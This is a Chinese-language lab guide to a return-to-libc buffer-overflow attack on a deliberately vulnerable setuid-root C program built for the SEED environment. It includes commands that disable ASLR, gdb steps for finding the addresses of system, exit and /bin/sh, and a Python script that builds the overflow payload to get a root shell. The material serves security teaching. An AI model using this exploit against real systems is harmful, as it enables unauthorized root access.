# return-to-libc 攻击

## 1. 环境准备

> 注：本实验指南已经考虑对SEED VM Ubuntu 20.04-64bit和Ubuntu 16.04-32bit的环境兼容

(关闭地址随机化) `sudo sysctl -w kernel.randomize_va_space=0`

(创建漏洞程序) 程序源码如下：
```c
#include "stdio.h"
#include "stdlib.h"
#include "string.h"

int foo(char *str) {
    char buffer[100];

	strcpy(buffer, str);
	return 1;
} 

int main(int argc, char **argv) {
	char str[400];
	FILE *badfile;

	badfile = fopen("badfile", "r");
	fread(str, sizeof(char), 300, badfile);
	foo(str);

	printf("Returned Properly\n");
	return 1;
}

```

(编译32位程序并设置为setuid程序)
```bash
gcc -m32 -fno-stack-protector -z noexecstack -o stack_32 stack.c
sudo chown root stack_32
sudo chmod 4755 stack_32
```

## 2. 通过调试找到system与exit函数地址

```bash
$ touch badfile
$ gdb -q stack_32
$ r
$ p system
# 此处输出system函数地址
$ p exit
# 此处输出exit函数地址
```

## 3. 找到/bin/sh字符串的地址

首先创建一个打印环境变量地址的程序：

```c
// envaddr.c

#include "stdio.h"
#include "stdlib.h"

int main() {
	char *shell = (char *)getenv("MYSHELL");
	if (shell) {
		printf("Value: %s\n", shell);
		printf("Address: %x\n", (unsigned int)shell);
	}
	return 1;
}
```
随后编译并打印环境变量地址（**特别注意**，要开启`-m32`将env55也编译为32位，和stack_32保持一致性）：
```bash
gcc -m32 envaddr.c -o env55
export MYSHELL="/bin/sh"
./env55
# 此处会打印出环境变量MYSHELL的地址，在我的机器上是Address: ffffd495
```

## 4. 构建恶意输入badfile

首先通过调试找到main调用foo函数时，ebp与buffer的地址：
```bash
$ gcc -m32 -fno-stack-protector -z noexecstack -g -o stack_32_dbg stack.c
$ touch badfile
$ gdb -q stack_32_dbg
$ b foo
$ r
$ n
$ p $ebp
# 此处输出ebp的地址，我的机器为0xffffd018
$ p &buffer
# 此处输出buffer的地址，我的机器为0xffffcfac
$ p/d 0xffffd018 - 0xffffcfac
108 # 该差值在不同机器一致
```

编写python脚本(ret2libc_exploit.py)生成badfile

```python
#!/usr/bin/python3
import sys


content = bytearray(0xaa for i in range(300))

a3 = 0xffffd495 # address of 'bin/sh'
content[120:124] = (a3).to_bytes(4, byteorder='little')

a2 = 0xf7e04f80 # address of exit() function
content[116:120] = (a2).to_bytes(4, byteorder='little')

a1 = 0xf7e12420 # address of system() function
content[112:116] = (a1).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as wb:
    wb.write(content)
```

注意：其中的a1、a2、a3根据你自己调试获得的地址赋值。

```bash
# 生成badfile
chmod u+x ret2libc_exploit.py
./ret2libc_exploit.py
```

## 5. 发起攻击

```bash
# 让/bin/sh指向/bin/zsh
sudo ln -sf /bin/zsh /bin/sh
# 执行stack_32
./stack
# 此时应该得到shell, 使用id查看权限
id
```
